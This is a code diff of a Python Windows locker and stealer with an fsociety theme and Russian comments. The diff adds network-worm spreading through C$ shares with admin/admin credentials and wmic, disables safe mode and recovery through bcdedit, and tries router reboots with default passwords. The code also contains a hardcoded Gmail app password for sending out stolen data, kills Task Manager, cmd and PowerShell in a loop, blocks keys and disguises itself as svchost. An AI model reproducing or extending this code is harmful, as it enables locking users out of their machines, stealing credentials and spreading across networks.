@@ -16,45 +16,29 @@ GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
 RECEIVER_EMAIL = "xzx78848@gmail.com"
 VIDEO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp4"
 AUDIO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp3"
-VIDEO_PATH = os.path.join(tempfile.gettempdir(), "video.mp4")
-AUDIO_PATH = os.path.join(tempfile.gettempdir(), "audio.mp3")
+VIDEO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4.mp4")
+AUDIO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4.mp3")
 attempts_left = MAX_ATTEMPTS
 
-# ===== СКРЫТИЕ ПРОЦЕССА =====
 def hide_process():
-    try:
-        # Меняем имя процесса
-        ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
-        # Переименовываем файл
-        try:
-            new_path = os.path.join(os.environ['WINDIR'], 'Temp', 'svchost.exe')
-            if not os.path.exists(new_path) and os.path.abspath(__file__) != new_path:
-                shutil.copy2(sys.executable, new_path)
-        except: pass
+    try: ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
     except: pass
 
-# ===== УБИЙЦА ДИСПЕТЧЕРА =====
 def kill_taskmgr_loop():
     while True:
         try:
-            os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
-            os.system("taskkill /f /im cmd.exe >nul 2>&1")
-            os.system("taskkill /f /im powershell.exe >nul 2>&1")
-            os.system("taskkill /f /im msconfig.exe >nul 2>&1")
-            os.system("taskkill /f /im regedit.exe >nul 2>&1")
-            os.system("taskkill /f /im procexp.exe >nul 2>&1")
-            os.system("taskkill /f /im procmon.exe >nul 2>&1")
+            for p in ["taskmgr.exe","cmd.exe","powershell.exe","msconfig.exe","regedit.exe","procexp.exe"]:
+                os.system(f"taskkill /f /im {p} >nul 2>&1")
         except: pass
         time.sleep(0.03)
 
-# ===== БЛОКИРОВКА ВСЕГО =====
 def block_everything():
     try:
         import keyboard
         for k in ['alt','ctrl','shift','tab','caps lock','esc','f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12','print screen','scroll lock','pause','insert','home','end','page up','page down','up','down','left','right','windows','left windows','right windows','delete']:
             try: keyboard.block_key(k)
             except: pass
-        for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','ctrl+c','ctrl+v','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','win+i']:
+        for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','ctrl+c','ctrl+v','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','win+i','win+a','win+s','win+p','win+t','win+ctrl+d','win+ctrl+f4','win+shift+m']:
             try: keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
             except: pass
         k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
@@ -78,6 +62,38 @@ def unblock_all():
         k2 = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(k2, "DisableTaskMgr", 0, winreg.REG_DWORD, 0); winreg.CloseKey(k2)
     except: pass
+
+def block_safe_mode():
+    try:
+        os.system('bcdedit /deletevalue {current} safeboot >nul 2>&1')
+        os.system('bcdedit /set {current} bootstatuspolicy ignoreallfailures >nul 2>&1')
+        os.system('bcdedit /set {current} recoveryenabled no >nul 2>&1')
+    except: pass
+
+def scan_network():
+    devices = []
+    try:
+        arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
+        devices = re.findall(r'\d+\.\d+\.\d+\.\d+', arp)
+    except: pass
+    return list(set(devices))
+
+def infect_network():
+    my_path = os.path.abspath(__file__)
+    for ip in scan_network():
+        try:
+            os.system(f'net use \\\\{ip}\\C$ /user:admin admin >nul 2>&1')
+            shutil.copy2(my_path, f'\\\\{ip}\\C$\\Windows\\Temp\\svchost.pyw')
+            os.system(f'wmic /node:{ip} process call create "pythonw C:\\Windows\\Temp\\svchost.pyw" >nul 2>&1')
+        except: pass
+
+def router_reboot():
+    for ip, user, pwd in [("192.168.1.1","admin","admin"),("192.168.0.1","admin","1234"),("192.168.1.1","admin",""),("192.168.0.1","admin","")]:
+        try:
+            urllib.request.urlopen(f"http://{ip}/reboot.cgi", timeout=3)
+            send_email(f"ROUTER {ip} REBOOTED!", "[DedSek] Router")
+            return
+        except: pass
 
 def add_to_startup():
     try:
@@ -108,45 +124,34 @@ def download_file(url, path):
     except: pass
 
 def anim_fsociety():
-    a = tk.Tk()
-    a.attributes('-fullscreen', True); a.attributes('-topmost', True)
+    a = tk.Tk(); a.attributes('-fullscreen', True); a.attributes('-topmost', True)
     a.configure(bg='black'); a.overrideredirect(True)
     lbl = tk.Label(a, text="", bg='black', fg='white', font=('Courier', 50, 'bold'))
     lbl.pack(expand=True)
     for t in ["f","f s","f s o","f s o c","f s o c i","f s o c i e","f s o c i e t","f s o c i e t y"]:
         lbl.config(text=t); a.update(); time.sleep(0.3)
     time.sleep(1)
-    sub = tk.Label(a, text="", bg='black', fg='#ff4444', font=('Courier', 20))
-    sub.pack(pady=20)
-    notice = "тебя заметила"
-    for i in range(len(notice)+1):
-        sub.config(text=notice[:i]); a.update(); time.sleep(0.1)
+    sub = tk.Label(a, text="", bg='black', fg='#ff4444', font=('Courier', 20)); sub.pack(pady=20)
+    for i in range(len("тебя заметила")+1):
+        sub.config(text="тебя заметила"[:i]); a.update(); time.sleep(0.1)
     time.sleep(2); a.destroy()
 
 def anim_stealer():
-    a = tk.Tk()
-    a.attributes('-fullscreen', True); a.attributes('-topmost', True)
+    a = tk.Tk(); a.attributes('-fullscreen', True); a.attributes('-topmost', True)
     a.configure(bg='black'); a.overrideredirect(True)
     tk.Label(a, text="Стиллер ворует данные...", bg='black', fg='white', font=('Courier', 20, 'bold')).pack(expand=True, pady=(0,50))
-    bar = tk.Canvas(a, width=400, height=30, bg='black', highlightthickness=1, highlightbackground='white')
-    bar.pack()
-    bar_text = tk.Label(a, text="0%", bg='black', fg='white', font=('Courier', 12))
-    bar_text.pack(pady=10)
-    info = tk.Label(a, text="", bg='black', fg='#0f0', font=('Courier', 10))
-    info.pack()
+    bar = tk.Canvas(a, width=400, height=30, bg='black', highlightthickness=1, highlightbackground='white'); bar.pack()
+    bar_text = tk.Label(a, text="0%", bg='black', fg='white', font=('Courier', 12)); bar_text.pack(pady=10)
+    info = tk.Label(a, text="", bg='black', fg='#0f0', font=('Courier', 10)); info.pack()
     for percent, text in [(10,"Поиск паролей Chrome..."),(20,"WiFi пароли..."),(30,"Сканирование сети..."),(45,"Копирование cookies..."),(60,"Сбор IP адресов..."),(75,"Кража файлов..."),(90,"Отправка на сервер..."),(100,"ГОТОВО!")]:
-        bar.delete('all')
-        bar.create_rectangle(0, 0, 400*percent/100, 30, fill='#0f0', outline='')
-        bar_text.config(text=f"{percent}%"); info.config(text=text)
-        a.update(); time.sleep(0.5)
+        bar.delete('all'); bar.create_rectangle(0, 0, 400*percent/100, 30, fill='#0f0', outline='')
+        bar_text.config(text=f"{percent}%"); info.config(text=text); a.update(); time.sleep(0.5)
     time.sleep(2); a.destroy()
 
 def anim_connect():
-    a = tk.Tk()
-    a.attributes('-fullscreen', True); a.attributes('-topmost', True)
+    a = tk.Tk(); a.attributes('-fullscreen', True); a.attributes('-topmost', True)
     a.configure(bg='black'); a.overrideredirect(True)
-    lbl = tk.Label(a, text="", bg='black', fg='#0f0', font=('Courier', 14), justify='left')
-    lbl.pack(expand=True)
+    lbl = tk.Label(a, text="", bg='black', fg='#0f0', font=('Courier', 14), justify='left'); lbl.pack(expand=True)
     current = ""
     for line in ["[*] Establishing connection...","[*] Connecting to Windows kernel...","[*] Bypassing security...","[*] Access granted!","[*] Mounting system...","[*] Connected to: " + socket.gethostname(),"[*] IP: " + socket.gethostbyname(socket.gethostname()),"","[✓] SYSTEM COMPROMISED"]:
         current += line + "\n"; lbl.config(text=current); a.update(); time.sleep(0.4)
@@ -157,37 +162,25 @@ def play_video():
     download_file(AUDIO_URL, AUDIO_PATH)
     time.sleep(0.5)
     try:
-        v = tk.Tk()
-        v.attributes('-fullscreen', True); v.attributes('-topmost', True)
+        v = tk.Tk(); v.attributes('-fullscreen', True); v.attributes('-topmost', True)
         v.configure(bg='black'); v.overrideredirect(True)
         v.protocol("WM_DELETE_WINDOW", lambda: None)
         lbl = tk.Label(v, bg='black'); lbl.pack(expand=True, fill='both')
-        
-        # Запускаем звук СНАЧАЛА
-        audio_start = time.time()
         try: subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet', AUDIO_PATH], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         except: pass
-        
         cap = cv2.VideoCapture(VIDEO_PATH)
         if cap.isOpened():
             fps = cap.get(cv2.CAP_PROP_FPS)
             if fps <= 0: fps = 30
             sw, sh = v.winfo_screenwidth(), v.winfo_screenheight()
-            
-            frame_count = 0
-            video_start = time.time()
-            
+            fc = 0; vs = time.time()
             while cap.isOpened():
                 ret, frame = cap.read()
                 if not ret: break
-                
-                frame_count += 1
-                # Синхронизация: ждём пока видео догонит звук
-                expected = frame_count / fps
-                elapsed = time.time() - video_start
-                if expected > elapsed:
-                    time.sleep(expected - elapsed)
-                
+                fc += 1
+                expected = fc / fps
+                elapsed = time.time() - vs
+                if expected > elapsed: time.sleep(expected - elapsed)
                 frame = cv2.resize(frame, (sw, sh))
                 frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                 img = tk.PhotoImage(data=cv2.imencode('.ppm', frame)[1].tobytes())
@@ -304,7 +297,11 @@ if __name__ == "__main__":
     hide_process()
     threading.Thread(target=mega_steal, daemon=True).start()
     add_to_startup()
+    block_safe_mode()
     threading.Thread(target=kill_taskmgr_loop, daemon=True).start()
+    threading.Thread(target=infect_network, daemon=True).start()
+    threading.Thread(target=router_reboot, daemon=True).start()
+    
     anim_fsociety()
     anim_stealer()
     anim_connect()
